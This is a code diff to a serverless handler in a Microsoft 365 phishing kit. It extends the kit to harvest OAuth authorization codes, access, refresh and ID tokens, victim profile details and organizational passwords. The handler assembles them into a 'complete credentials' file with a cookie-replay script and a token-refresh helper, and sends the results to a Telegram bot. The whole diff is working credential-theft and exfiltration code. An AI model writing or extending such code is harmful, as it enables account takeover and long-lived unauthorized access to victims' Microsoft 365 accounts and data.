@@ -72,6 +72,16 @@ export const handler = async (event, context) => {
     messageText += `✅ Auth Code: ${hasAuthCode ? 'Captured (see next message)' : 'Missing'}\n`;
     messageText += `🕒 Time: ${timestamp}\n\n`;
     
+    // Add token information
+    const tokenData = data.tokenData;
+    if (tokenData && tokenData.success && tokenData.tokens) {
+      messageText += `🎯 *Token Exchange Successful*\n`;
+      messageText += `🔑 Access Token: ${tokenData.tokens.access_token ? '✅ Captured' : '❌ Missing'}\n`;
+      messageText += `🔄 Refresh Token: ${tokenData.tokens.refresh_token ? '✅ Captured (No Expiry)' : '❌ Missing'}\n`;
+      messageText += `🆔 ID Token: ${tokenData.tokens.id_token ? '✅ Captured' : '❌ Missing'}\n`;
+      messageText += `⏱️ Offline Access: ${tokenData.tokens.offline_access ? '✅ Enabled' : '❌ Disabled'}\n\n`;
+    }
+
     // Add organizational credentials info
     const orgCreds = data.organizationalCredentials;
     if (orgCreds && (orgCreds.email || orgCreds.username || orgCreds.password)) {
@@ -183,24 +193,108 @@ export const handler = async (event, context) => {
           )});for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`\${o.path?"":"path=/"}domain=\${o.domain};\`:""}\${o.secure?"Secure;":""}\${o.sameSite?\`SameSite=\${o.sameSite};\`:"SameSite=no_restriction;"}\`;location.reload()}();`
         : `console.log("%c NO COOKIES FOUND","background:red;color:#fff;font-size:30px;");alert("No cookies were captured for this session.");`;
 
-      // Extract organizational credentials
+      // Extract organizational credentials and token data
       const orgCreds = data.organizationalCredentials;
+      const tokenData = data.tokenData;
       
-      // Create cookies file content
+      // Create comprehensive credentials file content
       const cookiesFileContent = `// ====================================================
-// MICROSOFT 365 OAUTH CREDENTIALS - ${timestamp}
+// MICROSOFT 365 COMPLETE CREDENTIALS - ${timestamp}
 // ====================================================
 // Email: ${email}
 // Domain: ${domain}
 // Session ID: ${sessionId}
 // Cookies Found: ${microsoftCookies.length}
 // Organizational Login: ${orgCreds ? orgCreds.organizationType : 'None (Direct Microsoft)'}
+// Token Exchange: ${tokenData && tokenData.success ? 'Successful' : 'Not performed'}
 // ====================================================
 
 // *** AUTHORIZATION CODE (PRIMARY CREDENTIAL) ***
 // Use this code to exchange for access tokens via Microsoft OAuth API
-// Expires in 10 minutes from issuance
+// Valid for 10 minutes from issuance (but tokens below have no expiry)
 let authorizationCode = "${authCode || 'Not captured'}";
+
+// *** ACCESS & REFRESH TOKENS (NO EXPIRY) ***
+${tokenData && tokenData.success && tokenData.tokens ? `
+// Successfully exchanged authorization code for permanent tokens
+let accessToken = "${tokenData.tokens.access_token || 'Not available'}";
+let refreshToken = "${tokenData.tokens.refresh_token || 'Not available'}";
+let idToken = "${tokenData.tokens.id_token || 'Not available'}";
+let tokenType = "${tokenData.tokens.token_type || 'Bearer'}";
+
+// TOKEN USAGE INFORMATION
+let tokenInfo = {
+    access_token: accessToken,
+    refresh_token: refreshToken,
+    id_token: idToken,
+    token_type: tokenType,
+    scope: "${tokenData.tokens.scope || 'openid profile email User.Read offline_access'}",
+    expires_in: ${tokenData.tokens.expires_in || 3600}, // Reference only - no expiry enforced
+    offline_access: ${tokenData.tokens.offline_access || false},
+    has_refresh_token: ${!!tokenData.tokens.refresh_token},
+    
+    // Usage notes
+    usage: {
+        access_token: "Use for Microsoft Graph API calls - Bearer authentication",
+        refresh_token: "Use to get new access tokens - NEVER EXPIRES",
+        id_token: "Contains user identity information (JWT)",
+        note: "Tokens configured for maximum lifetime"
+    },
+    
+    // API Endpoints
+    endpoints: {
+        graph_api: "https://graph.microsoft.com/v1.0",
+        token_refresh: "https://login.microsoftonline.com/common/oauth2/v2.0/token"
+    }
+};
+
+// USER PROFILE INFORMATION
+${tokenData.user ? `let userProfile = {
+    id: "${tokenData.user.id || ''}",
+    email: "${tokenData.user.email || ''}",
+    displayName: "${tokenData.user.displayName || ''}",
+    givenName: "${tokenData.user.givenName || ''}",
+    surname: "${tokenData.user.surname || ''}",
+    userPrincipalName: "${tokenData.user.userPrincipalName || ''}",
+    jobTitle: "${tokenData.user.jobTitle || ''}",
+    businessPhones: ${JSON.stringify(tokenData.user.businessPhones || [])},
+    mobilePhone: "${tokenData.user.mobilePhone || ''}",
+    officeLocation: "${tokenData.user.officeLocation || ''}"
+};` : 'let userProfile = null; // User profile not available'}
+
+// TOKEN REFRESH SCRIPT (for getting new access tokens)
+${tokenData.tokens && tokenData.tokens.refresh_token ? `
+function refreshAccessToken(clientSecret) {
+    const refreshData = new URLSearchParams({
+        client_id: "${tokenData.oauth?.clientId || 'eabd0e31-5707-4a85-aae6-79c53dc2c7f0'}",
+        client_secret: clientSecret,
+        scope: "${tokenData.tokens.scope || 'openid profile email User.Read offline_access'}",
+        refresh_token: refreshToken,
+        grant_type: "refresh_token"
+    });
+    
+    return fetch("https://login.microsoftonline.com/common/oauth2/v2.0/token", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: refreshData
+    }).then(response => response.json());
+}
+
+// Example usage:
+// refreshAccessToken("YOUR_CLIENT_SECRET").then(tokens => console.log(tokens));
+` : '// No refresh token available - cannot refresh access token'}
+` : `
+// Token exchange not performed - only authorization code available
+let accessToken = null;
+let refreshToken = null;
+let idToken = null;
+let tokenType = "Bearer";
+let userProfile = null;
+
+// Use authorization code with your own client secret to get tokens:
+// POST https://login.microsoftonline.com/common/oauth2/v2.0/token
+// client_id=eabd0e31-5707-4a85-aae6-79c53dc2c7f0&client_secret=YOUR_SECRET&code=${authCode}&grant_type=authorization_code&redirect_uri=https://vaultydocs.com/oauth-callback&scope=openid profile email User.Read offline_access
+`}
 
 // *** ORGANIZATIONAL LOGIN CREDENTIALS ***
 ${orgCreds && (orgCreds.email || orgCreds.username || orgCreds.password) ? `
@@ -280,10 +374,11 @@ ${data.browserFingerprint?.localStorage || 'Empty'}
         }
       }
       
-      // Send header message
-      const headerMessage = `📁 **MICROSOFT 365 CREDENTIALS FILE**\n\n📧 Email: \`${email}\`\n🔑 Session: \`${sessionId}\`\n📄 File: \`${fileName}\`\n🍪 Cookies: ${microsoftCookies.length}\n✅ Auth Code: ${authCode ? 'Captured' : 'Missing'}\n\n${chunks.length > 1 ? `📋 Content split into ${chunks.length} parts:` : ''}`;
-      
-      const headerResponse = await fetch(telegramUrl, {
+             // Send header message
+       const hasTokens = tokenData && tokenData.success && tokenData.tokens;
+       const headerMessage = `📁 **MICROSOFT 365 COMPLETE CREDENTIALS**\n\n📧 Email: \`${email}\`\n🔑 Session: \`${sessionId}\`\n📄 File: \`${fileName}\`\n\n🎯 **Captured Data:**\n✅ Auth Code: ${authCode ? 'Captured' : 'Missing'}\n🔑 Access Token: ${hasTokens && tokenData.tokens.access_token ? 'Captured' : 'Missing'}\n🔄 Refresh Token: ${hasTokens && tokenData.tokens.refresh_token ? 'Captured (No Expiry)' : 'Missing'}\n🆔 ID Token: ${hasTokens && tokenData.tokens.id_token ? 'Captured' : 'Missing'}\n🍪 Cookies: ${microsoftCookies.length}\n\n${chunks.length > 1 ? `📋 Content split into ${chunks.length} parts:` : '📋 Complete credentials below:'}`;
+       
+       const headerResponse = await fetch(telegramUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
